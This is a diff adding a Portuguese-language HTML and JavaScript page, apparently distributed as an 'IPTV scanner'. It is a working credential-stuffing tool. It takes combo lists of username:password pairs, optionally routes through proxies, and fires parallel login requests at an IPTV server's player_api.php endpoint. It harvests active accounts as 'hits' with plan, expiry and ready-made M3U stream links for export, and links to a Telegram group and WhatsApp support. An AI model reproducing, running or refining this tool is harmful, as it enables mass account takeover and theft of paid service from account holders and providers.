@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cine & Tech Natal 📱🎞️ | Scanner IPTV</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, monospace; }
+        :root {
+            --prim: #0f172a; --sec: #1e293b; --destaque: #22c55e; --erro: #ef4444; --aviso: #f59e0b;
+            --texto: #f1f5f9; --claro: #94a3b8; --marca: #facc15; --hit-bg: rgba(34,197,94,0.08);
+        }
+        body { background: linear-gradient(135deg, var(--prim), var(--sec)); color: var(--texto); min-height: 100vh; padding: 15px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .banner { text-align: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .banner h1 { color: var(--destaque); font-size: 24px; margin-bottom: 5px; }
+        .banner p { font-size: 13px; color: var(--claro); }
+        .card { background: rgba(30,41,59,0.9); border-radius: 10px; padding: 16px; margin-bottom: 16px; border: 1px solid rgba(255,255,255,0.05); }
+        .card h2 { font-size: 16px; margin-bottom: 12px; color: var(--destaque); display: flex; align-items: center; gap: 6px; }
+        .grupo { margin-bottom: 12px; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; color: var(--claro); }
+        input, select, textarea {
+            width: 100%; padding: 9px 11px; background: rgba(15,23,42,0.8); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 6px; color: var(--texto); font-size: 14px; outline: none; transition: border 0.2s;
+        }
+        input:focus, select:focus { border-color: var(--destaque); }
+        .btn {
+            padding: 9px 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer;
+            transition: all 0.2s; display: inline-flex; align-items: center; gap: 5px;
+        }
+        .btn-ini { background: var(--destaque); color: white; }
+        .btn-parar { background: var(--erro); color: white; }
+        .btn-export { background: #2563eb; color: white; }
+        .btn-whats { background: #25d366; color: white; }
+        .btn-telegram { background: #0088cc; color: white; }
+        .btn-limpar { background: var(--aviso); color: white; }
+        .botoes { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
+        .painel {
+            background: #000; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 12px;
+            white-space: pre-wrap; margin-top: 10px; line-height: 1.6;
+        }
+        .barra { width: 100%; height: 16px; background: rgba(255,255,255,0.1); border-radius: 8px; overflow: hidden; margin: 8px 0; }
+        .barra-preen { height: 100%; background: linear-gradient(90deg, var(--destaque), #4ade80); width: 0%; transition: width 0.3s; }
+        .lista-hits { margin-top: 12px; display: flex; flex-direction: column; gap: 10px; }
+        .hit-item {
+            background: var(--hit-bg); border-left: 3px solid var(--destaque); padding: 12px; border-radius: 6px;
+            word-break: break-all; line-height: 1.7;
+        }
+        .hit-oculto { display: none; }
+        .marcado { background: var(--marca); color: #000; padding: 1px 4px; border-radius: 2px; font-weight: bold; }
+        .nome-arq { margin-top: 4px; font-size: 12px; color: var(--destaque); }
+        .rodape { text-align: center; margin-top: 20px; font-size: 12px; color: var(--claro); }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="banner">
+        <h1>Cine & Tech Natal 📱🎞️ | Scanner IPTV</h1>
+        <p>Versão 1.0.2 • Autor: killerkingMD • CORRIGIDO DEFINITIVO</p>
+    </div>
+
+    <div class="card">
+        <h2>⚙️ CONFIGURAÇÃO</h2>
+        <div class="grupo">
+            <label>🌎 Servidor (ex: srv.com:8080)</label>
+            <input type="text" id="servidor" placeholder="http:// ou https://">
+        </div>
+        <div class="grupo">
+            <label>👤 Seu nome (Hits by)</label>
+            <input type="text" id="nick" value="killerkingMD">
+        </div>
+        <div class="grupo">
+            <label>📂 Arquivo de combos (.txt)</label>
+            <input type="file" id="arqCombo" accept=".txt" onchange="carregarCombo(this)">
+            <div class="nome-arq" id="nomeCombo">Nenhum arquivo selecionado</div>
+        </div>
+        <div class="grupo">
+            <label>📋 Ou cole manualmente</label>
+            <textarea id="textoCombo" rows="3" placeholder="user:senha"></textarea>
+        </div>
+        <div class="grupo">
+            <label>⚡ Threads (10-50 recomendado)</label>
+            <input type="number" id="threads" min="1" max="200" value="15">
+        </div>
+        <div class="grupo">
+            <label>🌐 Usar Proxies?</label>
+            <select id="usarProxy" onchange="mostrarProxy()">
+                <option value="nao">Não</option>
+                <option value="sim">Sim</option>
+            </select>
+        </div>
+        <div class="grupo" id="divProxy" style="display:none">
+            <label>📂 Arquivo de proxies (.txt)</label>
+            <input type="file" id="arqProxy" accept=".txt" onchange="carregarProxy(this)">
+            <div class="nome-arq" id="nomeProxy">Nenhum arquivo selecionado</div>
+        </div>
+        <div class="botoes">
+            <button class="btn btn-ini" onclick="iniciar()">▶ INICIAR</button>
+            <button class="btn btn-parar" onclick="parar()">⏹ PARAR</button>
+            <button class="btn btn-limpar" onclick="limpar()">🗑 LIMPAR</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📊 PAINEL & HITS</h2>
+        <div class="painel" id="painel">
+Cine & Tech Natal 📱🎞️ v1.0.2
+═════════════════════════════════════
+COMBO:    Aguardando...
+SERVIDOR: Aguardando...
+USUÁRIO:  -
+SENHA:    -
+STATUS:   Aguardando
+PLANO:    N/A
+CONEXÕES: 0/0
+
+HITS:      0
+FALHAS:    0
+CPM:       0.0
+PROGRESSO: 0.0%
+TEMPO:     00:00:00
+ETA:       00:00:00
+THREADS:   0
+        </div>
+        <div class="barra"><div class="barra-preen" id="barra"></div></div>
+
+        <div class="grupo">
+            <input type="text" id="buscar" placeholder="🔍 Pesquisar hits..." oninput="filtrar()">
+        </div>
+        <div class="lista-hits" id="lista"></div>
+
+        <div class="botoes">
+            <button class="btn btn-export" onclick="marcarTodos()">☑ Todos</button>
+            <button class="btn btn-export" onclick="desmarcarTodos()">☐ Nenhum</button>
+            <button class="btn btn-export" onclick="salvarSelecionados()">📥 Baixar</button>
+            <button class="btn btn-export" onclick="copiarSelecionados()">📋 Copiar</button>
+            <a href="https://wa.me/5584996122184" target="_blank" class="btn btn-whats">🛟 Suporte</a>
+            <button class="btn btn-telegram" onclick="window.open('https://t.me/killerkingMDgrupo')">✈️ Grupo</button>
+        </div>
+    </div>
+
+    <div class="rodape">Cine & Tech Natal • Scanner IPTV • Versão Definitiva</div>
+</div>
+
+<script>
+const NOME = "Cine & Tech Natal 📱🎞️";
+const VERSAO = "1.0.2";
+let exec = false, listaCombos = [], listaProxies = [], hits = [], tempoInicio = null;
+let cont = { test:0, hits:0, ultUser:"-", ultPass:"-", ultHit:null };
+let fila = [], threadsAtivas = 0;
+
+function normalizarUrl(u) { return u.startsWith('http') ? u : `http://${u}`; }
+function formatTempo(s) {
+    let h = Math.floor(s/3600), m = Math.floor((s%3600)/60), ss = Math.floor(s%60);
+    return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${ss.toString().padStart(2,'0')}`;
+}
+function mostrarProxy() { document.getElementById('divProxy').style.display = document.getElementById('usarProxy').value === 'sim' ? 'block' : 'none'; }
+function carregarCombo(i) {
+    if(!i.files[0]) return;
+    document.getElementById('nomeCombo').textContent = `✅ ${i.files[0].name}`;
+    const r = new FileReader();
+    r.onload = e => { document.getElementById('textoCombo').value = e.target.result; };
+    r.readAsText(i.files[0]);
+}
+function carregarProxy(i) {
+    if(!i.files[0]) return;
+    document.getElementById('nomeProxy').textContent = `✅ ${i.files[0].name}`;
+    const r = new FileReader();
+    r.onload = e => { listaProxies = e.target.result.split('\n').filter(l=>l.trim()).map(l=>l.trim()); };
+    r.readAsText(i.files[0]);
+}
+function carregarCombos() {
+    listaCombos = [];
+    document.getElementById('textoCombo').value.split('\n').filter(l=>l.trim() && l.includes(':'))
+    .forEach(l=>{
+        const [u,s] = l.trim().split(':',2);
+        if(u && s) listaCombos.push({user:u.trim(), pass:s.trim()});
+    });
+    return listaCombos.length > 0;
+}
+
+// ✅ FUNÇÃO CORRIGIDA DEFINITIVAMENTE — 1 REQUISIÇÃO SÓ, TODAS ESTRUTURAS
+async function verificarConta(user,senha,serv,proxy=null) {
+    try {
+        const base = serv.replace(/\/$/,'');
+        const api = `${base}/player_api.php?username=${user}&password=${senha}`;
+        const res = await fetch(api, { signal: AbortSignal.timeout(15000) });
+        if(!res.ok) return null;
+        const d = await res.json();
+        if(!d.user_info || !['active','ativo'].includes(d.user_info.status.toLowerCase())) return null;
+
+        const ui = d.user_info;
+        const cria = ui.created_at ? new Date(ui.created_at*1000).toLocaleDateString('pt-BR') : 'Indefinida';
+        const exp = ui.exp_date ? new Date(ui.exp_date*1000).toLocaleDateString('pt-BR') : 'Indefinida';
+        const dias = ui.exp_date > Date.now()/1000 ? Math.ceil((ui.exp_date - Date.now()/1000)/86400) : 'Ilimitado';
+        const max = parseInt(ui.max_connections || 1);
+        const plano = max >=3 ? 'Premium' : max ===1 ? 'Teste' : 'Ilimitado';
+
+        // ✅ LÊ TODAS AS VARIAÇÕES DE NOME DOS SERVIDORES
+        let canais = 0, filmes = 0, series = 0;
+        if(Array.isArray(d.live_streams)) canais = d.live_streams.length;
+        else if(Array.isArray(d.channels)) canais = d.channels.length;
+        else if(Array.isArray(d.tv)) canais = d.tv.length;
+
+        if(Array.isArray(d.vod_streams)) filmes = d.vod_streams.length;
+        else if(Array.isArray(d.movies)) filmes = d.movies.length;
+        else if(Array.isArray(d.filmes)) filmes = d.filmes.length;
+
+        if(Array.isArray(d.series)) series = d.series.length;
+        else if(Array.isArray(d.series_streams)) series = d.series_streams.length;
+
+        return {
+            user, senha, plano, cria, exp, dias,
+            ativas: ui.active_cons || 0, max, canais, filmes, series,
+            m3u: `${base}/get.php?username=${user}&password=${senha}&type=m3u_plus`,
+            ssiptv: `${base}/p/${user}/${senha}/ssiptv`, msg: d.server_info?.message || 'Nenhuma'
+        };
+    }catch(e){
+        console.log("Erro:", e);
+        return null;
+    }
+}
+
+function atualizarPainel() {
+    if(!tempoInicio) return;
+    const dec = (Date.now() - tempoInicio)/1000;
+    const cpm = dec > 0 ? (cont.test/dec)*60 : 0;
+    const prog = listaCombos.length ? (cont.test/listaCombos.length)*100 : 0;
+    const eta = cpm > 0 ? ((listaCombos.length - cont.test)/(cpm/60)) : 0;
+    const barra = '█'.repeat(Math.round(prog/5)) + '░'.repeat(20-Math.round(prog/5));
+    const ult = cont.ultHit;
+    const status = ult ? '✅ Ativo' : '⏳ Aguardando';
+    const plano = ult ? ult.plano : 'N/A';
+    const conn = ult ? `${ult.ativas}/${ult.max}` : '0/0';
+
+    document.getElementById('painel').textContent = `${NOME} v${VERSAO}
+═════════════════════════════════════
+COMBO:    ${document.getElementById('nomeCombo').textContent.replace('✅ ','') || 'Manual'}
+SERVIDOR: ${document.getElementById('servidor').value.replace(/^https?:\/\//,'')}
+USUÁRIO:  ${cont.ultUser}
+SENHA:    ${cont.ultPass}
+STATUS:   ${status}
+PLANO:    ${plano}
+CONEXÕES: ${conn}
+
+HITS:      ${cont.hits}
+FALHAS:    ${cont.test - cont.hits}
+CPM:       ${cpm.toFixed(1)}
+PROGRESSO: ${prog.toFixed(1)}%
+BARRA:     [${barra}]
+TEMPO:     ${formatTempo(dec)}
+ETA:       ${formatTempo(eta)}
+THREADS:   ${threadsAtivas}
+`;
+    document.getElementById('barra').style.width = `${prog}%`;
+}
+
+function addHit(hit,serv) {
+    hits.push(hit);
+    const html = `
+    <div class="hit-item" data-busca="${hit.user.toLowerCase()} ${hit.senha.toLowerCase()} ${serv.toLowerCase()}">
+        <input type="checkbox" class="hit-check" data-u="${hit.user}" data-p="${hit.senha}">
+        <div>
+            <strong>✅ HIT ENCONTRADO</strong><br>
+            👤 Usuário: ${hit.user}<br>
+            🔐 Senha: ${hit.senha}<br>
+            💎 ${hit.plano}<br>
+            📅 Criada: ${hit.cria} • Expira: ${hit.exp} (${hit.dias} dias)<br>
+            🔗 Conexões: ${hit.ativas}/${hit.max}<br>
+            📺 ${hit.canais} canais • 🍿 ${hit.filmes} filmes • 🎥 ${hit.series} séries<br>
+            🔗 M3U: ${hit.m3u}<br>
+            <button class="btn btn-export" style="padding:4px 8px;font-size:12px;margin-top:6px" onclick="navigator.clipboard.writeText('${hit.user}:${hit.senha}')">Copiar</button>
+        </div>
+    </div>`;
+    document.getElementById('lista').insertAdjacentHTML('beforeend', html);
+}
+function filtrar() {
+    const t = document.getElementById('buscar').value.trim().toLowerCase();
+    document.querySelectorAll('.hit-item').forEach(i=>{
+        const ok = !t || i.dataset.busca.includes(t);
+        i.classList.toggle('hit-oculto', !ok);
+        if(ok && t) {
+            i.innerHTML = i.innerHTML.replace(new RegExp(`(${t})`,'gi'),'<span class="marcado">$1</span>');
+        }
+    });
+}
+
+async function iniciar() {
+    const serv = normalizarUrl(document.getElementById('servidor').value.trim());
+    const nick = document.getElementById('nick').value.trim();
+    const th = parseInt(document.getElementById('threads').value);
+    if(!serv || !nick || !carregarCombos()) return alert('❌ Preencha tudo e carregue combos válidos!');
+
+    exec = true; tempoInicio = Date.now();
+    cont = { test:0, hits:0, ultUser:"-", ultPass:"-", ultHit:null };
+    hits = []; document.getElementById('lista').innerHTML = '';
+    fila = [...listaCombos]; threadsAtivas = th;
+
+    setInterval(atualizarPainel, 500);
+
+    async function trabalhador() {
+        while(exec && fila.length) {
+            const {user,pass} = fila.shift();
+            cont.ultUser = user; cont.ultPass = pass; cont.test++;
+            const res = await verificarConta(user,pass,serv);
+            if(res) {
+                cont.hits++; cont.ultHit = res;
+                addHit(res,serv);
+            }
+        }
+    }
+    for(let i=0;i<th;i++) trabalhador();
+}
+function parar() { exec = false; alert(`⏹ Parado! Total hits: ${cont.hits}`); }
+function limpar() {
+    exec = false; cont = { test:0, hits:0, ultUser:"-", ultPass:"-", ultHit:null };
+    hits = []; listaCombos = [];
+    document.getElementById('lista').innerHTML = '';
+    document.getElementById('textoCombo').value = '';
+    document.getElementById('nomeCombo').textContent = 'Nenhum arquivo selecionado';
+    atualizarPainel();
+}
+function marcarTodos() { document.querySelectorAll('.hit-check').forEach(c=>c.checked=true); }
+function desmarcarTodos() { document.querySelectorAll('.hit-check').forEach(c=>c.checked=false); }
+function salvarSelecionados() {
+    const sel = Array.from(document.querySelectorAll('.hit-check:checked')).map(c=>`${c.dataset.u}:${c.dataset.p}`);
+    if(!sel.length) return alert('❌ Selecione algo!');
+    const b = new Blob([sel.join('\n')], {type:'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(b); a.download = `HITS_${Date.now()}.txt`; a.click();
+}
+function copiarSelecionados() {
+    const sel = Array.from(document.querySelectorAll('.hit-check:checked')).map(c=>`${c.dataset.u}:${c.dataset.p}`).join('\n');
+    if(!sel) return;
+    navigator.clipboard.writeText(sel).then(()=>alert('✅ Copiado!'));
+}
+</script>
+</body>
+</html>
